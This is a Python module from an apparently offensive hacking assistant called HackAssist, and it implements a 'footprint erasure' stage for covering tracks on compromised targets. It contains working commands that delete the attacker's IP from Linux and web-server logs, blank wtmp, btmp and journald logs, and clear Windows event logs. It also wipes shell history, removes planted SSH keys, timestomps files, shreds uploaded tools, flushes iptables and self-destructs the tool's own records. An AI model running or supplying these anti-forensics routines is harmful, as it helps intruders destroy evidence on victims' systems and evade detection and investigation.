"""Footprint Erasure — cover tracks, clean evidence, self-destruct.

Erases traces on target systems (logs, history, uploaded tools) and locally
(HackAssist session data, defense logs, the tool itself). Every destructive
command requires explicit user confirmation via run_with_preview().
"""

import sys
import os
import shutil
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ui import (show_stage_header, show_menu, ask, info, warning, error,
                success, console, confirm, show_knowledge)
from executor import run_with_preview, run_command
from knowledge import STAGES, ANTI_FORENSICS
from rich.prompt import Prompt

STAGE = "footprint_erasure"


def run(session):
    stage_info = STAGES["footprint_erasure"]
    show_stage_header(stage_info["name"], "Cover tracks, erase evidence & self-destruct")

    while True:
        options = [
            ("1", "Linux Log Cleanup"),
            ("2", "Windows Log Cleanup (command generator)"),
            ("3", "Shell History Wipe"),
            ("4", "Web Server Log Cleanup"),
            ("5", "SSH Trace Cleanup"),
            ("6", "Timestomping"),
            ("7", "Uploaded Tools Cleanup (secure delete)"),
            ("8", "Network Trace Cleanup"),
            ("9", "[bold red]Self-Destruct[/bold red] — Erase HackAssist & all data"),
            ("10", "Anti-Forensics Checklist"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _linux_logs(session)
        elif choice == "2":
            _windows_logs(session)
        elif choice == "3":
            _shell_history(session)
        elif choice == "4":
            _webserver_logs(session)
        elif choice == "5":
            _ssh_cleanup(session)
        elif choice == "6":
            _timestomp(session)
        elif choice == "7":
            _uploaded_tools(session)
        elif choice == "8":
            _network_traces(session)
        elif choice == "9":
            _self_destruct(session)
        elif choice == "10":
            _anti_forensics_checklist()


# ─── Linux Log Cleanup ───────────────────────────────────────────────────────

def _linux_logs(session):
    console.print("\n[bold cyan]Linux Log Cleanup[/bold cyan]")
    console.print("[dim]Requires root/sudo on target system[/dim]\n")

    # Ask if user wants targeted removal or full wipe
    options = [
        ("1", "Remove specific IP from logs (targeted — less suspicious)"),
        ("2", "Wipe entire log files (aggressive — empty logs are suspicious)"),
        ("3", "Clear journal / systemd logs"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        ip = ask("Enter your IP to remove from logs")
        target_logs = [
            f"sudo sed -i '/{ip}/d' /var/log/auth.log",
            f"sudo sed -i '/{ip}/d' /var/log/syslog",
            f"sudo sed -i '/{ip}/d' /var/log/daemon.log",
            f"sudo sed -i '/{ip}/d' /var/log/messages",
            f"sudo sed -i '/{ip}/d' /var/log/kern.log",
        ]
        warning(f"This will remove all lines containing '{ip}' from system logs.")
        for cmd in target_logs:
            run_with_preview(cmd, session, STAGE)

    elif choice == "2":
        log_files = [
            "/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log",
            "/var/log/daemon.log", "/var/log/messages",
            "/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog",
        ]
        warning("Wiping entire log files. Empty logs are a red flag to defenders!")
        if confirm("Wipe all listed logs?"):
            for logf in log_files:
                run_with_preview(f"sudo cat /dev/null > {logf}", session, STAGE)

    elif choice == "3":
        run_with_preview(
            "sudo journalctl --flush --rotate && sudo journalctl --vacuum-time=1s",
            session, STAGE
        )


# ─── Windows Log Cleanup ─────────────────────────────────────────────────────

def _windows_logs(session):
    console.print("\n[bold cyan]Windows Log Cleanup[/bold cyan]")
    console.print("[dim]Copy these commands to run on the Windows target[/dim]\n")

    options = [
        ("1", "Clear all Event Viewer logs"),
        ("2", "Clear specific event log"),
        ("3", "Clear PowerShell history"),
        ("4", "Clear recent files & prefetch"),
        ("5", "Clear RDP cache"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return

    commands = ANTI_FORENSICS["windows"]

    if choice == "1":
        console.print("\n[bold yellow]Run on Windows target:[/bold yellow]\n")
        for desc, cmd in commands[:5]:
            console.print(f"  [yellow]{desc}:[/yellow]")
            console.print(f"  [white]{cmd}[/white]\n")

    elif choice == "2":
        log_name = ask("Event log name (System, Security, Application)")
        console.print(f"\n  [white]wevtutil cl {log_name}[/white]\n")

    elif choice == "3":
        desc, cmd = commands[5]
        console.print(f"\n  [yellow]{desc}:[/yellow]")
        console.print(f"  [white]{cmd}[/white]\n")

    elif choice == "4":
        for desc, cmd in commands[6:9]:
            console.print(f"  [yellow]{desc}:[/yellow]")
            console.print(f"  [white]{cmd}[/white]\n")

    elif choice == "5":
        desc, cmd = commands[9]
        console.print(f"  [yellow]{desc}:[/yellow]")
        console.print(f"  [white]{cmd}[/white]\n")

    info("Copy commands above and run on your Windows target.")


# ─── Shell History Wipe ───────────────────────────────────────────────────────

def _shell_history(session):
    console.print("\n[bold cyan]Shell History Wipe[/bold cyan]\n")

    home = os.path.expanduser("~")
    history_files = [
        ("Bash history", os.path.join(home, ".bash_history")),
        ("Zsh history", os.path.join(home, ".zsh_history")),
        ("Python history", os.path.join(home, ".python_history")),
        ("MySQL history", os.path.join(home, ".mysql_history")),
        ("Less history", os.path.join(home, ".lesshst")),
        ("Vim info", os.path.join(home, ".viminfo")),
        ("Node REPL history", os.path.join(home, ".node_repl_history")),
        ("SQLite history", os.path.join(home, ".sqlite_history")),
    ]

    # Show which exist
    found = []
    for desc, path in history_files:
        exists = os.path.exists(path)
        status = "[green]Found[/green]" if exists else "[dim]Not found[/dim]"
        console.print(f"  {status}  {desc}: [dim]{path}[/dim]")
        if exists:
            found.append((desc, path))

    console.print()

    if not found:
        info("No history files found to clean.")
        return

    options = [
        ("1", f"Wipe all {len(found)} found history files"),
        ("2", "Select specific files to wipe"),
        ("3", "Disable history for this session only"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        warning(f"This will permanently erase {len(found)} history files.")
        for desc, path in found:
            run_with_preview(f"cat /dev/null > '{path}'", session, STAGE)
        # Also clear in-memory history
        run_with_preview("history -c 2>/dev/null; export HISTSIZE=0", session, STAGE)
        success("All history files wiped.")

    elif choice == "2":
        for i, (desc, path) in enumerate(found, 1):
            if confirm(f"Wipe {desc} ({path})?", default=False):
                run_with_preview(f"cat /dev/null > '{path}'", session, STAGE)

    elif choice == "3":
        info("Run these in your current shell to disable history:")
        console.print("  [white]unset HISTFILE[/white]")
        console.print("  [white]export HISTSIZE=0[/white]")
        console.print("  [white]export HISTFILESIZE=0[/white]")
        console.print("  [white]set +o history[/white]\n")


# ─── Web Server Log Cleanup ──────────────────────────────────────────────────

def _webserver_logs(session):
    console.print("\n[bold cyan]Web Server Log Cleanup[/bold cyan]\n")

    options = [
        ("1", "Remove specific IP from Apache logs"),
        ("2", "Remove specific IP from Nginx logs"),
        ("3", "Wipe all Apache logs"),
        ("4", "Wipe all Nginx logs"),
        ("5", "Show IIS cleanup commands (Windows)"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice in ("1", "2"):
        ip = ask("Enter your IP to remove from logs")
        ip_escaped = ip.replace(".", "\\.")
        if choice == "1":
            run_with_preview(f"sudo sed -i '/{ip_escaped}/d' /var/log/apache2/access.log", session, STAGE)
            run_with_preview(f"sudo sed -i '/{ip_escaped}/d' /var/log/apache2/error.log", session, STAGE)
        else:
            run_with_preview(f"sudo sed -i '/{ip_escaped}/d' /var/log/nginx/access.log", session, STAGE)
            run_with_preview(f"sudo sed -i '/{ip_escaped}/d' /var/log/nginx/error.log", session, STAGE)
    elif choice == "3":
        run_with_preview("sudo cat /dev/null > /var/log/apache2/access.log", session, STAGE)
        run_with_preview("sudo cat /dev/null > /var/log/apache2/error.log", session, STAGE)
    elif choice == "4":
        run_with_preview("sudo cat /dev/null > /var/log/nginx/access.log", session, STAGE)
        run_with_preview("sudo cat /dev/null > /var/log/nginx/error.log", session, STAGE)
    elif choice == "5":
        console.print("\n[yellow]Run on Windows target:[/yellow]")
        console.print("  [white]del /F /Q C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*[/white]\n")


# ─── SSH Trace Cleanup ────────────────────────────────────────────────────────

def _ssh_cleanup(session):
    console.print("\n[bold cyan]SSH Trace Cleanup[/bold cyan]\n")

    options = [
        ("1", "Remove specific host from known_hosts"),
        ("2", "Clear all known_hosts"),
        ("3", "Clear SSH agent keys"),
        ("4", "Remove authorized_key you added (on target)"),
        ("5", "Clear SSH connection logs"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        host = ask("Enter hostname or IP to remove")
        run_with_preview(f"ssh-keygen -R {host}", session, STAGE)
    elif choice == "2":
        known_hosts = os.path.expanduser("~/.ssh/known_hosts")
        warning(f"This will wipe {known_hosts}")
        run_with_preview(f"cat /dev/null > {known_hosts}", session, STAGE)
    elif choice == "3":
        run_with_preview("ssh-add -D", session, STAGE)
    elif choice == "4":
        key_id = ask("Enter a unique string from the key to remove (e.g. user@host)")
        run_with_preview(
            f"sed -i '/{key_id}/d' ~/.ssh/authorized_keys",
            session, STAGE
        )
    elif choice == "5":
        run_with_preview("sudo cat /dev/null > /var/log/auth.log", session, STAGE)


# ─── Timestomping ────────────────────────────────────────────────────────────

def _timestomp(session):
    console.print("\n[bold cyan]Timestomping[/bold cyan]")
    console.print("[dim]Modify file timestamps to blend in with legitimate files[/dim]\n")

    options = [
        ("1", "Set specific timestamp on a file"),
        ("2", "Clone timestamp from another file"),
        ("3", "Set timestamp on multiple files (directory)"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        filepath = ask("File path to modify")
        timestamp = ask("Timestamp (YYYYMMDDhhmm format, e.g. 202301011200)")
        run_with_preview(f"touch -t {timestamp} '{filepath}'", session, STAGE)
        info("Verify with: stat '{filepath}'")

    elif choice == "2":
        source = ask("Reference file (clone timestamp FROM this)")
        target = ask("Target file (apply timestamp TO this)")
        run_with_preview(f"touch -r '{source}' '{target}'", session, STAGE)

    elif choice == "3":
        directory = ask("Directory containing files to timestomp")
        timestamp = ask("Timestamp (YYYYMMDDhhmm format)")
        run_with_preview(
            f"find '{directory}' -type f -exec touch -t {timestamp} {{}} \\;",
            session, STAGE
        )


# ─── Uploaded Tools Cleanup ──────────────────────────────────────────────────

def _uploaded_tools(session):
    console.print("\n[bold cyan]Uploaded Tools & Scripts Cleanup[/bold cyan]")
    console.print("[dim]Securely delete files you transferred to the target[/dim]\n")

    options = [
        ("1", "Securely delete specific file"),
        ("2", "Securely delete a directory"),
        ("3", "Common cleanup paths (/tmp, /dev/shm, /var/tmp)"),
        ("4", "Overwrite then delete (Linux shred)"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        filepath = ask("File path to securely delete")
        # macOS uses rm -P for 3-pass overwrite, Linux uses shred
        run_with_preview(
            f"rm -Pf '{filepath}' 2>/dev/null || shred -vfz -n 5 '{filepath}' && rm -f '{filepath}'",
            session, STAGE
        )
    elif choice == "2":
        dirpath = ask("Directory to securely delete")
        warning(f"This will recursively destroy: {dirpath}")
        run_with_preview(
            f"find '{dirpath}' -type f -exec rm -Pf {{}} \\; 2>/dev/null; rm -rf '{dirpath}'",
            session, STAGE
        )
    elif choice == "3":
        common_paths = ["/tmp", "/dev/shm", "/var/tmp"]
        info("Cleaning common attacker artifact directories:")
        for path in common_paths:
            if confirm(f"Clean {path}?", default=False):
                run_with_preview(
                    f"sudo find {path} -user $(whoami) -type f -exec rm -Pf {{}} \\; 2>/dev/null",
                    session, STAGE
                )
    elif choice == "4":
        filepath = ask("File to shred")
        passes = ask("Number of overwrite passes", default="5")
        run_with_preview(f"shred -vfz -n {passes} '{filepath}' && rm -f '{filepath}'", session, STAGE)


# ─── Network Trace Cleanup ───────────────────────────────────────────────────

def _network_traces(session):
    console.print("\n[bold cyan]Network Trace Cleanup[/bold cyan]\n")

    import platform
    is_mac = platform.system() == "Darwin"

    options = [
        ("1", "Flush DNS cache"),
        ("2", "Flush ARP cache"),
        ("3", "Remove firewall rules added by HackAssist"),
        ("4", "Kill connections to specific IP"),
        ("5", "Full network cleanup (all of the above)"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        if is_mac:
            run_with_preview(
                "sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder",
                session, STAGE
            )
        else:
            run_with_preview("sudo systemd-resolve --flush-caches", session, STAGE)
    elif choice == "2":
        if is_mac:
            run_with_preview("sudo arp -d -a", session, STAGE)
        else:
            run_with_preview("sudo ip -s -s neigh flush all", session, STAGE)
    elif choice == "3":
        if is_mac:
            run_with_preview("sudo pfctl -a hackassist -F rules 2>/dev/null", session, STAGE)
            run_with_preview("sudo pfctl -F states 2>/dev/null", session, STAGE)
        else:
            warning("Run on target: iptables -F && iptables -X")
    elif choice == "4":
        ip = ask("Enter IP to kill connections to")
        run_with_preview(f"kill $(lsof -t -i @{ip}) 2>/dev/null", session, STAGE)
    elif choice == "5":
        warning("Running full network trace cleanup...")
        if is_mac:
            run_with_preview("sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder", session, STAGE)
            run_with_preview("sudo arp -d -a", session, STAGE)
            run_with_preview("sudo pfctl -a hackassist -F rules 2>/dev/null", session, STAGE)
        else:
            run_with_preview("sudo systemd-resolve --flush-caches", session, STAGE)
            run_with_preview("sudo ip -s -s neigh flush all", session, STAGE)
            run_with_preview("sudo iptables -F 2>/dev/null", session, STAGE)


# ─── Self-Destruct ───────────────────────────────────────────────────────────

def _self_destruct(session):
    console.print("\n[bold red]{'='*50}[/bold red]")
    console.print("[bold red]          SELF-DESTRUCT SEQUENCE[/bold red]")
    console.print(f"[bold red]{'='*50}[/bold red]\n")

    console.print("[bold]This will permanently destroy:[/bold]\n")

    hackassist_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    sessions_dir = os.path.expanduser("~/hackassist_sessions")
    defense_dir = os.path.expanduser("~/hackassist_defense")

    items = [
        (hackassist_dir, "HackAssist tool (all source code)"),
        (sessions_dir, "All engagement sessions & reports"),
        (defense_dir, "Defense monitor data & threat logs"),
    ]

    for path, desc in items:
        exists = os.path.exists(path)
        status = "[red]EXISTS[/red]" if exists else "[dim]Not found[/dim]"
        console.print(f"  {status}  [bold]{desc}[/bold]")
        console.print(f"           [dim]{path}[/dim]")

    console.print()
    console.print("[bold red]This action is IRREVERSIBLE.[/bold red]")
    console.print("[bold red]All data will be securely overwritten and deleted.[/bold red]\n")

    # Triple confirmation
    if not confirm("[1/3] Are you sure you want to self-destruct?", default=False):
        info("Self-destruct cancelled.")
        return

    if not confirm("[2/3] This will delete ALL HackAssist data. Really continue?", default=False):
        info("Self-destruct cancelled.")
        return

    response = Prompt.ask("[bold red][3/3] Type 'DESTROY' to confirm[/bold red]")
    if response.strip() != "DESTROY":
        info("Self-destruct cancelled (wrong confirmation word).")
        return

    console.print("\n[bold red]Initiating self-destruct...[/bold red]\n")

    # 1. Delete all session data
    if os.path.exists(sessions_dir):
        info(f"Destroying sessions: {sessions_dir}")
        _secure_delete_dir(sessions_dir)
        success("Sessions destroyed.")

    # 2. Delete defense data
    if os.path.exists(defense_dir):
        info(f"Destroying defense data: {defense_dir}")
        _secure_delete_dir(defense_dir)
        success("Defense data destroyed.")

    # 3. Clear shell history of hackassist references
    info("Cleaning shell history of HackAssist references...")
    home = os.path.expanduser("~")
    for hist_file in [".bash_history", ".zsh_history"]:
        hist_path = os.path.join(home, hist_file)
        if os.path.exists(hist_path):
            try:
                with open(hist_path, "r") as f:
                    lines = f.readlines()
                with open(hist_path, "w") as f:
                    for line in lines:
                        if "hackassist" not in line.lower() and "hack/" not in line.lower():
                            f.write(line)
                success(f"Cleaned {hist_file}")
            except (IOError, PermissionError):
                warning(f"Could not clean {hist_file}")

    # 4. Delete HackAssist itself (last step)
    if os.path.exists(hackassist_dir):
        info(f"Destroying HackAssist: {hackassist_dir}")
        _secure_delete_dir(hackassist_dir)

    console.print("\n[bold green]Self-destruct complete.[/bold green]")
    console.print("[bold green]All traces of HackAssist have been erased.[/bold green]")
    console.print("[dim]This process will now exit.[/dim]\n")

    import sys
    sys.exit(0)


def _secure_delete_dir(path):
    """Securely delete a directory — overwrite files before removing."""
    for root, dirs, files in os.walk(path):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                # Overwrite file contents with zeros
                size = os.path.getsize(fpath)
                if size > 0:
                    with open(fpath, "wb") as f:
                        f.write(b'\x00' * min(size, 10 * 1024 * 1024))  # Cap at 10MB
                os.remove(fpath)
            except (IOError, PermissionError, OSError):
                try:
                    os.remove(fpath)
                except OSError:
                    pass
    # Remove directory tree
    try:
        shutil.rmtree(path, ignore_errors=True)
    except Exception:
        pass


# ─── Anti-Forensics Checklist ─────────────────────────────────────────────────

def _anti_forensics_checklist():
    stage_info = STAGES["footprint_erasure"]
    show_knowledge("Anti-Forensics Guide", stage_info["description"])

    console.print("\n[bold cyan]Tips:[/bold cyan]")
    for tip in stage_info["tips"]:
        console.print(f"  [yellow]>[/yellow] {tip}")

    categories = [
        ("1", "Linux Commands"),
        ("2", "Windows Commands"),
        ("3", "Web Server Commands"),
        ("4", "SSH Cleanup"),
        ("5", "Network Cleanup"),
        ("0", "Back"),
    ]
    console.print()
    choice = show_menu(categories)

    cat_map = {
        "1": "linux", "2": "windows", "3": "webserver",
        "4": "ssh", "5": "network",
    }

    if choice == "0":
        return

    cat = cat_map.get(choice)
    if cat and cat in ANTI_FORENSICS:
        console.print(f"\n[bold cyan]{cat.title()} Anti-Forensics Commands:[/bold cyan]\n")
        for i, (desc, cmd) in enumerate(ANTI_FORENSICS[cat], 1):
            console.print(f"  [yellow]{i:2d}.[/yellow] [bold]{desc}[/bold]")
            console.print(f"      [white]{cmd}[/white]\n")
